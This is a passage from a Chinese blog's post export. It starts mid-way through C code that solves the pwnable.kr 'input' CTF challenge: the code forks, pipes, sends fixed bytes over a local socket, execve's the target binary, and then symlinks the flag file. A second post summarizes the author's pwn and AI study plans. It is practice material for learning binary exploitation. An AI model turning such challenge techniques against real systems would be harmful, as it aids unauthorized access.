4, 1, fp); fclose(fp); //stage2 pid_t childpid; int pipe_stdin[2]; int pipe_stderr[2]; // call pipe() on both pipes if (pipe(pipe_stdin) &lt; 0 || pipe(pipe_stderr) &lt; 0) &#123; perror(\"oh no\\n\"); exit(1); &#125; // fork the process if((childpid = fork()) &lt; 0) &#123; perror(\"fork failed, oop\"); exit(1); &#125; // child process can close input side of pipe and write expected values if(childpid == 0) &#123; /* Child process closes up input side of pipe */ close(pipe_stdin[0]); close(pipe_stderr[0]); write(pipe_stdin[1], \"\\x00\\x0a\\x00\\xff\", 4); write(pipe_stderr[1], \"\\x00\\x0a\\x02\\xff\", 4); /* Stage 5: network */ sleep(5); int sd, cd; struct sockaddr_in saddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf(\"socket error, tell admin\\n\"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); saddr.sin_port = htons(atoi(args['C'])); if(connect(sd, (struct sockaddr *)&amp;saddr, sizeof(saddr))&lt;0) &#123; printf(\"\\n Error : Connect Failed \\n\"); return 1; &#125; write(sd, \"\\xde\\xad\\xbe\\xef\", 4); close(sd); return 0; &#125; else &#123; /* parent process can close up output side of pipe, connect it to stdin and stderr, and then close the input side and call/home/input2/input */ close(pipe_stdin[1]); close(pipe_stderr[1]); dup2(pipe_stdin[0],0); dup2(pipe_stderr[0],2); close(pipe_stdin[0]); close(pipe_stderr[0]); execve(\"/home/input2/input\", args, env); &#125;&#125; 但是我们还没有完全成功，因为当前目录下没有flag,所以我们可以在当前目录下创建一个符号连接 1input2@ubuntu:/tmp/jl2$ ln -sf /home/input2/flag flag 现在再编译运行就成功了。","tags":[]},{"title":"近期学习总结以及今后stage","date":"2019-07-05T06:57:05.000Z","path":"year/07/05/cl6ewldaj003mj63f7xrn9j29/","text":"学习总结第一阶段：pwn意义探索与工具初步了解在这一阶段主要是迷茫的探索期，具体指大一上办学期。一开始连shell是什么都不太清楚，做题的时候不知道做题的目的是什么，网上搜到的题目，writeup也看不懂，很迷茫。这个时候其实没有很好的求教大师傅，走了很多弯路。不过这时自学尽头足，动力强。还是把深入理解计算机系统的前三四章给看了，王爽的汇编语言看了一部分。在suctf招新赛后，也才刚能写出带system函数的栈溢出题。总得来说大一上学期还是打下了一个好的底层基础的。这一阶段的收获主要是： 掌握了基本的计算机体系结构 基本的汇编指令，并且初步熟悉函数调用栈的过程 IDA pro以及pwntools和gdb的一些用法 html,css,js和vue 第二阶段：学习方向的迷茫与人工智能的学习大一下半学期，在这一阶段对自己学习的重点方向产生了迷茫。由于报人工智能项目的缘故，寒假将主要的学习时间就花在了人工智能方向上，看了吴恩达的机器学习视频课。开学以后也是人工智能为主，而此时pwn的学习陷入了不晓继续学习学什么的困境。依然是除了接触过的题目类型，其它类型题目的writeup根本看不懂，虽然这时隐约知道应该要自学下链接的部分，但是因为时间精力的缘故一直也继续学习，直到参加几场比赛经历了自闭以后，同学校的大师傅交流了几次，才对rop有个了解，意识到还是要好好学一学。于是看了南大计算机系统基础的视频课，以及CSAPP的链接部分以及程序员的自我修养的前八章。这阶段的收获主要是： 人工智能领域与机器学习的初步了解 利用tensorflow写cnn 动态链接和静态链接的了解 ROP题初步可以解决 今后学习规划暑假是一个学习的好时机，学习时间充分而自由。主要学习，完成数据结构作业，每天两小时的人工智能实验，每天至少两小时pwn题，平台主要就在xctf上。先把pwnable.kr上的题刷一遍，然后专题专刷一下rop的题目，接着就是ctfwiki上有关堆的例题在开学前一定全部搞懂。","tags":[]}]